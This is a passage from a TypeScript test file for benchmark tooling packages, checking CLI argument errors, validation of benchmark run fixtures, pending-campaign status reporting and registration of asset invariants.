    expect(JSON.parse(runVerifyLock(['--artifact-root=', '--json']).stdout)).toMatchObject({
      issues: [{ message: '--artifact-root requires a value' }],
    })
    expect(JSON.parse(runVerifyLock(['--artifact-root=relative', '--json']).stdout)).toMatchObject({
      issues: [{ message: '--artifact-root must be an absolute path' }],
    })
  })

  it('reports benchmark run field type errors after top-level fields parse', () => {
    const invalidFailureFixture = JSON.parse(benchmarkFixture()) as { baseline: { runs: Array<Record<string, unknown>> } }
    invalidFailureFixture.baseline.runs[0] = { ...invalidFailureFixture.baseline.runs[0], failure: 1 }
    const invalidFailure = tempFile('invalid-failure.json', JSON.stringify(invalidFailureFixture))
    const invalidBooleanFixture = JSON.parse(benchmarkFixture()) as { candidate: { runs: Array<Record<string, unknown>> } }
    invalidBooleanFixture.candidate.runs[0] = { ...invalidBooleanFixture.candidate.runs[0], success: 'yes' }
    const invalidBoolean = tempFile('invalid-boolean.json', JSON.stringify(invalidBooleanFixture))
    const invalidNumberFixture = JSON.parse(benchmarkFixture()) as { candidate: { runs: Array<Record<string, unknown>> } }
    invalidNumberFixture.candidate.runs[0] = { ...invalidNumberFixture.candidate.runs[0], firstTokenMs: Number.POSITIVE_INFINITY }
    const invalidNumber = tempFile('invalid-number.json', JSON.stringify(invalidNumberFixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidFailure, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.runs[0].failure must be null or a non-empty string' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidBoolean, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'candidate.runs[0].success must be a boolean' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidNumber, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'candidate.runs[0].firstTokenMs must be a non-negative finite number' }],
      })
    } finally {
      cleanup(invalidFailure)
      cleanup(invalidBoolean)
      cleanup(invalidNumber)
    }
  })

  it('rejects impossible benchmark numeric evidence before computing summaries', () => {
    const fixtures = [
      [
        tempFile('invalid-score.json', benchmarkFixture([benchmarkRun({ taskId: 'invalid-score', quality: 101 })])),
        'candidate.runs[15].quality must be between 0 and 100',
      ],
      [
        tempFile('negative-data-loss.json', benchmarkFixture([benchmarkRun({ taskId: 'negative-data-loss', dataLossEvents: -1 })])),
        'candidate.runs[15].dataLossEvents must be a non-negative safe integer',
      ],
      [
        tempFile('fractional-tokens.json', benchmarkFixture([benchmarkRun({ taskId: 'fractional-tokens', promptTokens: 1.5 })])),
        'candidate.runs[15].promptTokens must be a non-negative safe integer',
      ],
      [
        tempFile('negative-latency.json', benchmarkFixture([benchmarkRun({ taskId: 'negative-latency', firstTokenMs: -1 })])),
        'candidate.runs[15].firstTokenMs must be a non-negative finite number',
      ],
      [
        tempFile('negative-cost.json', benchmarkFixture([benchmarkRun({ taskId: 'negative-cost', costUsd: -0.01 })])),
        'candidate.runs[15].costUsd must be a non-negative finite number',
      ],
    ] as const
    try {
      for (const [path, message] of fixtures) {
        const result = runCompareBenchmark(['--fixture', path, '--json'])
        expect(result.status).toBe(1)
        expect(JSON.parse(result.stdout)).toMatchObject({
          command: 'compare-benchmark',
          ok: false,
          issues: [{ message }],
        })
      }
    } finally {
      for (const [path] of fixtures) cleanup(path)
    }
  })

  it('keeps pending long-cycle campaigns out of accepted status without fabricated runs', () => {
    const result = runCompareBenchmark(['--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'compare-benchmark',
      evidenceKind: 'planned',
      ok: false,
      status: 'pending',
      pendingCampaigns: [
        'web-search',
        'memory',
        'browser-computer-use',
        'mcp-management',
        'canary',
      ],
    })
  })
})

describe('curated-bench assets', () => {
  it('publishes benchmark asset directories and accepts their sentinels', () => {
    expect(curatedBenchBaselinesDir).toContain('/packages/curated/curated-bench/baselines/')
    expect(curatedBenchManifestsDir).toContain('/packages/curated/curated-bench/manifests/')
    expect(curatedBenchTasksDir).toContain('/packages/curated/curated-bench/tasks/')
    expect(curatedBenchInvariant.validateCuratedBenchAssets({
      baselines: curatedBenchBaselinesDir,
      manifests: curatedBenchManifestsDir,
      tasks: curatedBenchTasksDir,
    })).toEqual([])
  })

  it('reports each missing benchmark asset sentinel', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-bench-assets-'))
    const baselines = join(root, 'baselines')
    const manifests = join(root, 'manifests')
    const tasks = join(root, 'tasks')
    mkdirSync(baselines)
    mkdirSync(manifests)
    mkdirSync(tasks)
    try {
      expect(curatedBenchInvariant.validateCuratedBenchAssets({ baselines, manifests, tasks })).toEqual([
        'curated benchmark manifests directory is missing its sentinel',
        'curated benchmark tasks directory is missing its sentinel',
        'curated benchmark baselines directory is missing its sentinel',
      ])
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('reports benchmark invariant failures through the supplied callback', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-bench-invariant-'))
    const baselines = join(root, 'baselines')
    const manifests = join(root, 'manifests')
    const tasks = join(root, 'tasks')
    mkdirSync(baselines)
    mkdirSync(manifests)
    mkdirSync(tasks)
    try {
      const messages: string[] = []
      curatedBenchInvariant.reportCuratedBenchAssetFailures(
        { baselines, manifests, tasks },
        message => messages.push(message),
      )

      expect(messages).toEqual([
        'curated benchmark manifests directory is missing its sentinel',
        'curated benchmark tasks directory is missing its sentinel',
        'curated benchmark baselines directory is missing its sentinel',
      ])
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('registers the benchmark invariant under the package name', async () => {
    type InstalledInvariant = (ctx: unknown, fail: (message: string) => void) => void
    const disposer = () => {}
    const registered: { install?: InstalledInvariant; packageName?: string } = {}
    const ctx = {
      invariants: {
        register(packageName: string, install: InstalledInvariant) {
          registered.packageName = packageName
          registered.install = install
          return disposer
        },
      },
    }

    await expect(curatedBenchInvariant.apply(ctx as Parameters<typeof curatedBenchInvariant.apply>[0]))
      .resolves.toBe(disposer)
    expect(curatedBenchInvariant.name).toBe('curated-bench-invariant')
    expect(curatedBenchInvariant.inject).toEqual(['invariants'])
    expect(registered.packageName).toBe('@deepseek-ai/dsh-curated-bench')

    const messages: string[] = []
    registered.install?.(ctx, message => messages.push(message))
    expect(messages).toEqual([])
  })
})

describe('curated-scripts invariant companion', () => {
  it('registers its no-op invariant companion under the package name', async () => {
    type InstalledInvariant = (ctx: unknown, fail: (message: string) => void) => void
    const disposer = () => {}
    const registered: { install?: InstalledInvariant; packageName?: string } = {}
    const ctx = {
      invariants: {
        register(packageName: string, install: InstalledInvariant) {
          registered.packageName = packageName
          registered.install = install
          return disposer
        },
      },
    }

    await expect(curatedScriptsInvariant.apply(ctx as Parameters<typeof curatedScriptsInvariant.apply>[0]))
      .resolves.toBe(disposer)
    expect(curatedScriptsInvariant.name).toBe('curated-scripts-invariant')
    expect(curatedScriptsInvariant.inject).toEqual(['invariants'])
    expect(registered.packageName).toBe('@deepseek-ai/dsh-curated-scripts')

    const messages: string[] = []
    registered.install?.(ctx, message => messages.push(message))
    expect(messages).toEqual([])
  })
})
